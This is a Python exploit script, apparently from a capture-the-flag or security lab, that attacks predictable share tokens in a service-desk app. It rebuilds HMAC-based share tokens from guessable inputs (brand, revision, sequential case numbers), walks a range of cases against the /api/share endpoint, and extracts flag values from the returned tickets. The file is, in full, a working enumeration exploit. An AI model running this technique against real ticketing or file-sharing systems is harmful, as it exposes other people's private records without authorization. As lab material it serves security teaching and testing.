import argparse
import base64
import hashlib
import hmac
import sys

import requests

from _common import auth_headers, info, ok, register_or_login


TARGET_MARKER = "FLAG_VULN4_vendor_case_id_"


def derive_share_token(case_number: str, brand: str = "servicedesk.local",
                       revision: str = "v2", audience: str = "external-review") -> str:
    key = hashlib.sha256(f"{brand}|{revision}".encode("utf-8")).digest()[:32]
    material = "\x1f".join([brand, case_number, audience, revision]).encode("utf-8")
    mac = hmac.new(key, material, hashlib.sha256).digest()
    return base64.urlsafe_b64encode(mac).decode("ascii").rstrip("=")[:20]


def main():
    ap = argparse.ArgumentParser(description="Vuln 4: predictable share tokens")
    ap.add_argument("--base", default="http://localhost:8080")
    ap.add_argument("--brand", default="servicedesk.local")
    ap.add_argument("--revision", default="v2")
    ap.add_argument("--start", type=int, default=1, help="first case number to try")
    ap.add_argument("--count", type=int, default=200, help="how many cases to walk")
    args = ap.parse_args()

    username, token = register_or_login(args.base, prefix="red_v4")
    ok(f"registered attacker {username} (only used to keep a session alive)")

    info(f"walking cases SD-{args.start:06d} .. SD-{args.start + args.count - 1:06d}")
    found = []
    for i in range(args.start, args.start + args.count):
        case = f"SD-{i:06d}"
        share_token = derive_share_token(case, brand=args.brand, revision=args.revision)
        r = requests.get(f"{args.base}/api/share/{share_token}", timeout=5)
        if r.status_code != 200:
            continue
        body = r.json()
        ticket = body.get("ticket") or {}
        ext = ticket.get("vendor_case_id") or ""
        if TARGET_MARKER in ext:
            found.append((case, share_token, ext))
            ok(f"hit {case} token={share_token} vendor_case_id={ext!r}")
        else:
            info(f"{case} exists but no matching flag: vendor_case_id={ext!r}")

    if not found:
        info("no matching flag discovered within the walked range")
        sys.exit(2)

    for case, t, ext in found:
        ok(f"flag: case={case} token={t} value={ext}")


if __name__ == "__main__":
    main()
